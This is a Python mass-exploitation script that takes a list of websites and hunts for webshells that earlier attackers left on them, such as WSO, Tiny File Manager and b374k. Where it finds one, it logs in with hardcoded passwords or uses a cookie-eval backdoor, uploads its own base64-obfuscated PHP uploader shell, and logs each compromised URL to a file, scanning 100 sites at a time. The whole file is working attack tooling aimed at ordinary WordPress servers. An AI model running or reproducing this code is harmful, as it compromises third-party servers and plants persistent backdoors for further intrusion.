#!/usr/bin/python3
# -*- coding:utf-8 -*-
import sys, re , os
import time, base64, string, random, pprint
import requests, json
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)

Red  =   Fore.RED
Gre  =   Fore.GREEN
requests.urllib3.disable_warnings()


class BoTRxR:

	def __init__(self):
		self.headers = {'Connection': 'keep-alive','Cache-Control': 'max-age=0','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US,en;q=0.9,fr;q=0.8','referer': 'www.google.com'}
		# UPloaders here	
		self.shell_content =  """<?php eval(base64_decode(\"ZWNobyAiPHRpdGxlPlVwbG9hZGVyICBSeFIgSGFDa0VyPC90aXRsZT48Yj48L2JyPiIuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4iPC9icj4iLnBocF91bmFtZSgpOyAgICRjd2QgPSBnZXRjd2QoKTsgRWNobyAnPGNlbnRlcj4gIDxmb3JtIG1ldGhvZD0icG9zdCIgdGFyZ2V0PSJfc2VsZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+ICA8aW5wdXQgdHlwZT0iZmlsZSIgc2l6ZT0iMjAiIG5hbWU9InVwbG9hZHMiIC8+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJ1cGxvYWQiIC8+ICA8L2Zvcm0+ICA8L2NlbnRlcj48L3RkPjwvdHI+IDwvdGFibGU+PGJyPic7IGlmICghZW1wdHkgKCRfRklMRVNbJ3VwbG9hZHMnXSkpIHsgICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1cGxvYWRzJ11bJ3RtcF9uYW1lJ10sJF9GSUxFU1sndXBsb2FkcyddWyduYW1lJ10pOyAgICAgRWNobyAiPHNjcmlwdD5hbGVydCgndXBsb2FkIERvbmUnKTsgCSAJIDwvc2NyaXB0PjxiPlVwbG9hZGVkICEhITwvYj48YnI+bmFtZSA6ICIuJF9GSUxFU1sndXBsb2FkcyddWyduYW1lJ10uIjxicj5zaXplIDogIi4kX0ZJTEVTWyd1cGxvYWRzJ11bJ3NpemUnXS4iPGJyPnR5cGUgOiAiLiRfRklMRVNbJ3VwbG9hZHMnXVsndHlwZSddOyB9IDs=\"));?>');?>"""
		#Paths 
		self.TinyPaths = ['/wp-includes/js/tinymce/skins/lightgray/img/index.php?p=','/wp-content/themes/twentyseventeen/page/index.php?p=']
		self.YanzWebShells = ['wp-consar.php','alfa-rex.php7','alfanew.php']
	def Msgerror(self, text, color):
		print('Target:{} --> {}[Not Vulnerability]').format(text, color)
	def warning(self, text):
		print("[*] :"+text)
	def Msgcurrent(self, text, color):
		print("Target:{} --> {}[Succefully] eXpLotinG").format(text, color)
	def Msgdomain(self, text, color):
		print('Target:{} --> {}[Domain] [OF]').format(text, color)


	def ran(self, length):
		letters = string.hexdigits
		return ''.join(random.choice(letters) for i in range(length))
	def URLdomain(self, site):
		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site


	def UploadCloud(self, target, Path, filename,shell_content):
		data = {'submit':'Upload'}
		files = {'upload':(filename,shell_content)}
	
		UploaderPage = requests.post(target + Path, data=data, files=files, headers=self.headers, verify=False, timeout=20).content
		check = requests.get(target + Path, headers=self.headers, verify=False, timeout=20).content
		if(filename in check):
			return(True)
			
		else:
			return(False)
			
	def Uploadwbird(self, target, Path, filename,shell_content, directory):
	
		Agent = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
				 'Content-Type':'multipart/form-data; boundary=---------------------------113447527736818167743997149344',
				 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
				 
		UpSh = requests.Session()
		GeToup = {'cd':directory, 'x':'upload'}
		PageForUp = UpSh.get(target + Path, headers=self.headers, verify=False, timeout=20)
		print(PageForUp.content)
		# data = "-----------------------------113447527736818167743997149344\r\n"
		# data += "Content-Disposition: form-data; name=\"filepath[]\"; filename=\"aa.php\"\r\n"
		# data += "Content-Type: application/octet-stream\r\n"
		# data += "\r\n"
		# data += " aaaa\r\n"
		# data += "\r\n"
		# data += "\r\n"
		# data += "-----------------------------113447527736818167743997149344\r\n"
		# data += "Content-Disposition: form-data; name=\"savefolder[]\"\r\n"
		# data += "\r\n"
		# data += "/home/focsitua/balasoredistrictnarisangha.com/wp-content/themes/white-bird/\r\n"
		# data += "-----------------------------113447527736818167743997149344\r\n"
		# data += "Content-Disposition: form-data; name=\"savefilename[]\"\r\n"
		# data += "\r\n"
		# data += "\r\n"
		# data += "-----------------------------113447527736818167743997149344\r\n"
		# data += "Content-Disposition: form-data; name=\"uploadhd\"\r\n"
		# data += "\r\n"
		# data += "Upload !\r\n"
		# data += "-----------------------------113447527736818167743997149344\r\n"
		# data += "Content-Disposition: form-data; name=\"x\"\r\n"
		# data += "\r\n"
		# data += "upload\r\n"
		# data += "-----------------------------113447527736818167743997149344--\r\n"
		# data += "\r\n"
		# UploaderPage = UpSh.post(target + Path, data=data, headers=Agent, verify=False, timeout=20).content
		# check = requests.get(target + Path, headers=self.headers, verify=False, timeout=20).content
		# if(filename in check):
			# return(True)
			
		# else:
			# return(False)
			
			
	def YaznUploader(self, target, Path, filename, shell_content):

		ShLogin = requests.Session()
		logSh = ShLogin.post(target + Path, data={'password':'yanz'}, headers=self.headers, verify=False)

		filedata = {'a':'fm','c':'','p':'uploadFile','ch':'Windows-1251'}
		fileUpload = {'f':(filename,shell_content)}
		upFiles = ShLogin.post(target + Path, data=filedata, files=fileUpload, headers=self.headers, verify=False)

		response =  ShLogin.post(target + Path, data={'password':'yanz'}, headers=self.headers, verify=False)
		
		if(filename in response.content):
			return(True)
			
		else:
			return(False)
			
			
			
	def UploaderClassapi(self, target, Path, filename, shell_content):

		Shlog = requests.Session()
		logSh = Shlog.post(target + Path, data={'_rg':'888xyz999'}, headers=self.headers, verify=False)

		filedata = {'_rg':'888xyz999','a':'fm','c':'','p':'uf','ch':'Windows-1251'}
		fileUpload = {'f':(filename,shell_content,'Content-Type: application/octet-stream')}
		upFiles = Shlog.post(target + Path, data=filedata, files=fileUpload, headers=self.headers, verify=False)

		response =  Shlog.post(target + Path, data={'_rg':'888xyz999'}, headers=self.headers, verify=False)

		if(filename in response.content):
			return(True)
			
		else:
			return(False)


			
	def UploadApplica(self, target, Path, filename, shell_content):

		files = {'file':(filename,shell_content)}
	
		UploaderPage = requests.post(target + Path, files=files, headers=self.headers, verify=False, timeout=20).content
		check = requests.get(target + Path, headers=self.headers, verify=False, timeout=20).content
		if(filename in check):
			return(True)
			
		else:
			return(False)
			
	def UploadMarijua(self, target, Path, filename,shell_content):

		files = {'n[]':(filename,shell_content)}
	
		UploaderPage = requests.post(target + Path, files=files, headers=self.headers, verify=False, timeout=20).content
		if(filename in UploaderPage):
			return(True)
			
		else:
			return(False)
	def UploadWso426(self, target, Path, filename,shell_content):

		data = {'a':'FilesMan','c':'','p1':'uploadFile','ne':'','charset':'UTF-8'}
			
		files = {'f[]':(filename,shell_content)}
	
		UploaderPage = requests.post(target + Path, data=data, files=files, headers=self.headers, verify=False, timeout=20).content
		check = requests.get(target + Path, headers=self.headers, verify=False, timeout=20).content
		if(filename in check):
			return(True)
			
		else:
			return(False)
			
	def UploadWsodropdown(self, target, Path, filename,shell_content):

		data = {'a':'FilesMAn','c':'','p1':'uploadFile','charset':'Windows-1251'}
			
		files = {'f':(filename,shell_content)}
	
		UploaderPage = requests.post(target + Path, data=data, files=files, headers=self.headers, verify=False, timeout=20).content
		check = requests.get(target + Path, headers=self.headers, verify=False, timeout=20).content
		if(filename in check):
			return(True)
			
		else:
			return(False)
			
	def UploadWsoYanz(self, target, Path, filename,shell_content):

		data = {'a':'fm','c':'','p':'uploadFile','ch':'Windows-1251'}
			
		files = {'f':(filename,shell_content)}
	
		UploaderPage = requests.post(target + Path, data=data, files=files, headers=self.headers, verify=False, timeout=20).content
		check = requests.get(target + Path, headers=self.headers, verify=False, timeout=20).content
		if(filename in check):
			return(True)
			
		else:
			return(False)
			
	def UploadTinyM(self, target, Path, filename,shell_content):

		data = {'p':'','fullpath':filename}
			
		files = {'file':(filename,shell_content)}
	
		UploaderPage = requests.post(target + Path + "&upload", data=data, files=files, headers=self.headers, verify=False, timeout=20).content
		check = requests.get(target + Path, headers=self.headers, verify=False, timeout=20).content
		if(filename in check):
			return(True)
			
		else:
			return(False)
			
	# def wPUsers(self, target):
	
		# try:
			# url = "https://" + self.URLdomain(target)
			# try:
				# GetSource = requests.get(url + "/wp-json/wp/v2/users", headers=self.headers, verify=False, timeout=20)

			# except Exception as e:
				# url = url.replace("https://", "http://")
				# GetSource = requests.get(url + "/wp-json/wp/v2/users", headers=self.headers, verify=False, timeout=20)

			# #encoded_output = json.dumps(GetSource.text)
			# decoded_output = json.loads(str(GetSource.text))
			# self.current(decoded_output)
			# #for id in encoded_output:
			# #	self.current(id)

			
		
		# except Exception as ex:
			# self.error('Target:' + url + ' ----> is Dead  !')
			
	def WPCLass(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-content/themes/wpclassic/inc/index.php", headers=self.headers, verify=False, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-content/themes/wpclassic/inc/index.php", headers=self.headers, verify=False, timeout=20)
				
			filename = "RG7" + self.ran(6) + ".php"
			if('PK\x03\x04' in GetSource.content):
				Path = "/wp-content/themes/wpclassic/inc/index.php"
				BackDoors = "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-content/{}','w+'),'{}');".format(filename, self.shell_content)

				encoded_php = base64.b64encode(BackDoors)
				encoded_backdoor = base64.b64encode(encoded_php)

				cookies={'75':'base64_;','77':'decode;','41':'Y3JlYXRlX2;','64':'Z1bmN0aW9u;','21':'YmFzZTY0;','81':'X2RlY29kZQ==;','46':encoded_backdoor}
				Exp = requests.get(url + Path,cookies=cookies,headers=self.headers, verify=False, timeout=25).content

				MyShell = requests.get(url + "/wp-content/" + filename,headers=self.headers, verify=False, timeout=25).content
				
				if("RxR HaCkEr" in MyShell and "Uploader" in  MyShell):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/wp-content/" + filename + "\n")
						
				else:
					self.Msgerror(url, Red)
					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
		
	#def Woocommerce_Payments(self, ):
	
			
	def Updatas(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/updates.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/updates.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			if('WSO 4.2.6</title>' in GetSource.content or 'Uname:<br>User:<br>' in GetSource.content):
				Path = "/updates.php"

				
				if(self.UploadWso426(url, Path, filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)		
			
	

			
			
			
	def TinyFileManger(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			
			for Pat in self.TinyPaths:
				Path = Pat

				try:
					GetSource = requests.get(url + Path , headers=self.headers, timeout=20)

				except Exception as e:
					url = url.replace("https://", "http://")
					GetSource = requests.get(url + Path, headers=self.headers, verify=False, timeout=20)
					

				filename = "RG7" + self.ran(6) + ".php"
				if('<title>Tiny File Manager</title>' in GetSource.content or 'Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager' in GetSource.content):
					
					if(self.UploadTinyM(url, Path, filename, self.shell_content)):
						self.Msgcurrent(url, Gre)
						open('Uploaders.txt','a').write(url + "/" + filename + "\n")
					else:
						self.Msgerror(url, Red)
						
					break

						
				else:
					self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
		
		
	def CloudSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/.well-known/pki-validation/cloud.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/.well-known/pki-validation/cloud.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			if('Shell Bypass 403 GE-C666C' in GetSource.content or '<h1>Ghost Exploiter Team Official</h1>' in GetSource.content):
				Path = "/.well-known/pki-validation/cloud.php"


				if(self.UploadCloud(url, Path, filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/.well-known/pki-validation/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)



	def ApplicaSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-content/themes/applica/400.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-content/themes/applica/400.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			if('<title>#wp_config_error#</title>' in GetSource.content or '<h1>Ghost Exploiter Team Official</h1>' in GetSource.content):
				Path = "/wp-content/themes/applica/400.php"

				#self.Msgcurrent(url, Gre)
				if(self.UploadApplica(url, Path, filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/wp-content/themes/applica/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
			
	def UniversalSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-content/themes/universal-news/www.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-content/themes/universal-news/www.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			if('<title>MSQ_403</title>' in GetSource.content or '<th>Nama File / Folder</th>' in GetSource.content):
				Path = "/wp-content/themes/universal-news/www.php"


				if(self.UploadCloud(url, Path, filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/wp-content/themes/universal-news/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				

		except Exception as ex:
			self.Msgdomain(url, Red)
			
	def WsoYanzSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/repeater.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/repeater.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			if('WSOX ENC</title>' in GetSource.content or 'Yanz Webshell' in GetSource.content):
				Path = "/repeater.php"


				if(self.UploadWsoYanz(url, Path, filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/" + filename + "\n")
				else:
					self.Msgerror(url, Red)
					

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
			
	def WsoCacheSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-content/plugins/Cache/Cache.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-content/plugins/Cache/Cache.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			if('WSOX ENC</title>' in GetSource.content or 'Yanz Webshell' in GetSource.content):
				Path = "/wp-content/plugins/Cache/Cache.php"


				if(self.UploadWsoYanz(url, Path, filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/wp-content/plugins/Cache/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
			
	def WsoConsarSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			
			for Pat in self.YanzWebShells:
				Path =  "/" + Pat

				try:
					GetSource = requests.get(url + Path , headers=self.headers, timeout=20)

				except Exception as e:
					url = url.replace("https://", "http://")
					GetSource = requests.get(url  + Path, headers=self.headers, verify=False, timeout=20)
					

				filename = "RG7" + self.ran(6) + ".php"
				if('WSOX ENC</title>' in GetSource.content or 'Yanz Webshell' in GetSource.content):
					


					if(self.UploadWsoYanz(url, Path, filename, self.shell_content)):
						self.Msgcurrent(url, Gre)
						open('Uploaders.txt','a').write(url + "/" + filename + "\n")
					else:
						self.Msgerror(url, Red)
						
					break

						
				else:
					self.Msgerror(url, Red)
					
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
	def MarijuaSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-security.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-security.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			if('MARIJUANA' in GetSource.content or 'TheAlmightyZeus' in GetSource.content):
				Path = "/wp-security.php"


				if(self.UploadMarijua(url, Path, filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
			
	def WhitebirdSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-content/themes/white-bird/style.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-content/themes/white-bird/style.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"

			if('_#FB_28#_' in GetSource.content or 'b374k' in GetSource.content):
				Path = "/wp-content/themes/whitebird/style.php"

				directory = "/home/focsitua/balasoredistrictnarisangha.com/wp-content/themes/white-bird/"
				if(self.Uploadwbird(url, Path , filename, self.shell_content, directory)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
			
	def YaznpassSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-admin/css/colors/coffee/index.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-admin/css/colors/coffee/index.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"

			if('<input type="password" name="password">' in GetSource.content):
				Path = "/wp-admin/css/colors/coffee/index.php"

				if(self.YaznUploader(url, Path , filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/wp-admin/css/colors/coffee/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
			
	def classapiSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/class.api.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/class.api.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			
			if('<form action="" method="post"><input type="text" name="_rg">' in GetSource.content):
				Path = "/class.api.php"
			
				if(self.UploaderClassapi(url, Path , filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)
			
			
	def DropdownSh(self, target):
		try:
			url = "https://" + self.URLdomain(target)
			try:
				GetSource = requests.get(url + "/wp-admin/dropdown.php", headers=self.headers, timeout=20)

			except Exception as e:
				url = url.replace("https://", "http://")
				GetSource = requests.get(url + "/wp-admin/dropdown.php", headers=self.headers, verify=False, timeout=20)
				

			filename = "RG7" + self.ran(6) + ".php"
			
			if('<span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' in GetSource.content or '<span>Execute:</span>' in GetSource.content):
				Path = "/wp-admin/dropdown.php"

				if(self.UploadWsodropdown(url, Path , filename, self.shell_content)):
					self.Msgcurrent(url, Gre)
					open('Uploaders.txt','a').write(url + "/wp-admin/" + filename + "\n")
				else:
					self.Msgerror(url, Red)

					
			else:
				self.Msgerror(url, Red)
				
			
		
		except Exception as ex:
			self.Msgdomain(url, Red)


CodeRxR = BoTRxR()		
def RunTool(url):
    try:
		#UploaderClassapi
        #CodeRxR.wPUsers(url)
		CodeRxR.WPCLass(url)
		CodeRxR.Updatas(url)
		CodeRxR.TinyFileManger(url)
		CodeRxR.CloudSh(url)
		CodeRxR.ApplicaSh(url)
		CodeRxR.UniversalSh(url)
		CodeRxR.WsoYanzSh(url)
		CodeRxR.WsoCacheSh(url)
		CodeRxR.WsoConsarSh(url)
		CodeRxR.MarijuaSh(url)
		#This Not Done : CodeRxR.WhitebirdSh(url)
		CodeRxR.YaznpassSh(url)
		CodeRxR.classapiSh(url)
		CodeRxR.DropdownSh(url)
    except:
        pass
		
		


try:
	target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
	path = str(sys.argv[0]).split('\\')
	warning('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
	#exit()
mp = Pool(100)
mp.map(RunTool, target)
mp.close()
mp.join()